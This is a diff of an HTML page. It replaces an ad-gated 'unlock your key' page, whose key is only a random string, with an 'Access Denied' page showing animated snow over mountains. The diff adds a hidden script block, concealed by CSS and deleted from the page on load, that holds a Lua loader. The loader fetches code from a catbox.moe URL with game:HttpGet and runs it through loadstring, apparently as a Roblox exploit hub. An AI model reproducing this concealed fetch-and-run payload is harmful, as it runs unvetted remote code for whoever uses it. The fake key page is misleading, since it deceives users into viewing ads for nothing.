@@ -3,107 +3,164 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Secure 3-Ad Unlock</title>
+<title>Access Denied - Snowy Mountains with Wind</title>
 <style>
-  body {
-    margin:0;
-    font-family:'Segoe UI',sans-serif;
-    background:linear-gradient(135deg,#1e3c72,#2a5298);
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    color:#fff;
-  }
-  .container {
-    background:rgba(0,0,0,0.8);
-    padding:50px 30px;
-    border-radius:20px;
-    text-align:center;
-    max-width:500px;
-    width:90%;
-  }
-  button {
-    padding:10px 20px;
-    margin:10px 5px;
-    border:none;
-    border-radius:8px;
-    cursor:pointer;
-    background:#ff6b6b;
-    color:#fff;
-    font-weight:bold;
-    transition:0.2s;
-  }
-  button:hover { background:#ff4757; }
-  #key { display:none; font-size:1.5em; color:#2ed573; margin-top:20px; word-break:break-all; }
-  #status { margin-top:15px; font-weight:bold; }
+body {
+  margin: 0;
+  font-family: 'Segoe UI', Roboto, sans-serif;
+  height: 100vh;
+  overflow: hidden;
+  background: linear-gradient(to top, #1c1f2b, #3b3f57);
+  color: #fff;
+  position: relative;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+/* Mountains */
+.mountain {
+  position: absolute;
+  bottom: 0;
+  width: 200vw;
+  height: 50vh;
+  background: #2c3e50;
+  clip-path: polygon(0% 100%, 5% 60%, 15% 80%, 25% 45%, 40% 70%, 55% 40%, 70% 80%, 85% 50%, 100% 100%);
+  z-index: 1;
+}
+.mountain.back {
+  height: 60vh;
+  background: #1e2a36;
+  clip-path: polygon(0% 100%, 8% 70%, 20% 85%, 30% 55%, 45% 75%, 60% 45%, 75% 85%, 90% 65%, 100% 100%);
+  z-index: 0;
+}
+
+/* Glass panel */
+.panel {
+  position: relative;
+  background: rgba(255,255,255,0.05);
+  backdrop-filter: blur(12px);
+  border-radius: 16px;
+  padding: 5vh 5vw;
+  max-width: 90vw;
+  width: 90%;
+  box-shadow: 0 0 20px rgba(255,255,255,0.1), 0 0 40px rgba(0,0,0,0.5);
+  text-align: center;
+  z-index: 10;
+}
+
+h1 {
+  font-size: 6vw;
+  margin-bottom: 2vh;
+  text-shadow: 0 0 8px #aee, 0 0 16px #fff, 0 0 24px #88f;
+}
+
+p {
+  font-size: 4vw;
+  color: #ccc;
+  text-shadow: 0 0 6px rgba(0,0,0,0.5);
+}
+
+#payload { display: none !important; }
+
+/* Snowflake */
+.snowflake {
+  position: absolute;
+  color: #fff;
+  user-select: none;
+  pointer-events: none;
+  z-index: 5;
+  font-size: 3vw;
+  transform: rotate(0deg);
+}
 </style>
 </head>
 <body>
-<div class="container">
-<h1>Unlock Your Key</h1>
-<p>Press each ad button and keep the ad open for at least 3 seconds.</p>
 
-<button id="ad1">Ad 1</button>
-<button id="ad2">Ad 2</button>
-<button id="ad3">Ad 3</button>
+<div class="mountain back"></div>
+<div class="mountain"></div>
 
-<div id="status">Progress: 0/3 ads completed</div>
-<div id="key">XXXX-XXXX-XXXX-XXXX</div>
+<div class="panel">
+  <h1>Access Denied</h1>
+  <p>This content is not available in your browser.</p>
 </div>
 
+<!-- Hidden Lua payload -->
+<script type="text/plain" id="payload">
+local s = loadstring(game:HttpGet("https://files.catbox.moe/zfekoy.txt"))
+pcall(function() print("Lead hub is loading..."); s(); print("Script finished!") end)
+function test()
+  return "Working!"
+end
+</script>
+
 <script>
-const ads = [
-  {btn: document.getElementById('ad1'), done:false, window:null, start:0},
-  {btn: document.getElementById('ad2'), done:false, window:null, start:0},
-  {btn: document.getElementById('ad3'), done:false, window:null, start:0}
-];
-
-const keyEl = document.getElementById('key');
-const statusEl = document.getElementById('status');
-
-ads.forEach((ad,index)=>{
-    ad.btn.onclick = () => {
-        if(ad.done) return;
-        ad.window = window.open('https://example.com','_blank','width=800,height=600');
-        ad.start = Date.now();
-        checkAd(index);
-    };
+document.addEventListener('DOMContentLoaded', () => {
+  document.getElementById('payload')?.remove();
 });
 
-function checkAd(index){
-    const ad = ads[index];
-    const timer = setInterval(()=>{
-        if(!ad.window || ad.window.closed){
-            const elapsed = (Date.now() - ad.start)/1000;
-            if(elapsed < 3){
-                alert(`Oops! You rushed Ad ${index+1}! Please try again.`);
-            } else {
-                ad.done = true;
-                updateStatus();
-                if(ads.every(a=>a.done)) generateKey();
-            }
-            clearInterval(timer);
-        }
-    },50); // faster check every 50ms
-}
+// Wind snow setup
+let snowflakes = [];
+const snowCountNear = 100;
+const snowCountFar = 70;
+const windStrength = 0.3; // global wind speed, positive = right, negative = left
 
-function updateStatus(){
-    const completed = ads.filter(a=>a.done).length;
-    statusEl.innerText = `Progress: ${completed}/3 ads completed`;
-}
+function initSnow() {
+  snowflakes.forEach(s => s.el.remove());
+  snowflakes = [];
 
-function generateKey(){
-    let chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    let key = "";
-    for(let i=0;i<16;i++){
-        if(i>0 && i%4===0) key+="-";
-        key+=chars.charAt(Math.floor(Math.random()*chars.length));
+  function addSnow(count, layer) {
+    for(let i=0; i<count; i++){
+      const snow = document.createElement('div');
+      snow.className = 'snowflake';
+      snow.innerText = '❄';
+      snow.style.fontSize = (layer==='near' ? Math.random()*5+4 : Math.random()*3+2) + 'vw';
+      document.body.appendChild(snow);
+      snowflakes.push({
+        el: snow,
+        x: Math.random() * window.innerWidth,
+        y: Math.random() * -window.innerHeight,
+        speed: (layer==='near'?Math.random()*2+1.5:Math.random()*0.8+0.5),
+        drift: Math.random()*1 - 0.5,
+        angle: Math.random()*Math.PI*2,
+        rotateSpeed: Math.random()*2 - 1,
+        layer: layer
+      });
     }
-    keyEl.innerText = key;
-    keyEl.style.display="block";
-    statusEl.innerText="All ads completed! Key unlocked.";
+  }
+
+  addSnow(snowCountFar, 'far');
+  addSnow(snowCountNear, 'near');
 }
+
+initSnow();
+
+// Animate snow with wind
+function animateSnow() {
+  snowflakes.forEach(s => {
+    s.y += s.speed;
+    s.angle += 0.01;
+    s.x += Math.sin(s.angle)*0.5 + s.drift + windStrength; // add global wind
+    s.el.style.top = s.y + 'px';
+    s.el.style.left = s.x + 'px';
+    s.el.style.transform = `rotate(${s.angle*30}deg)`;
+
+    // reset if off screen
+    if(s.y > window.innerHeight){
+      s.y = -10;
+      s.x = Math.random() * window.innerWidth;
+    }
+    if(s.x > window.innerWidth) s.x = 0;
+    if(s.x < 0) s.x = window.innerWidth;
+  });
+
+  requestAnimationFrame(animateSnow);
+}
+animateSnow();
+
+// Handle mobile resize
+window.addEventListener('resize', initSnow);
 </script>
+
 </body>
 </html>
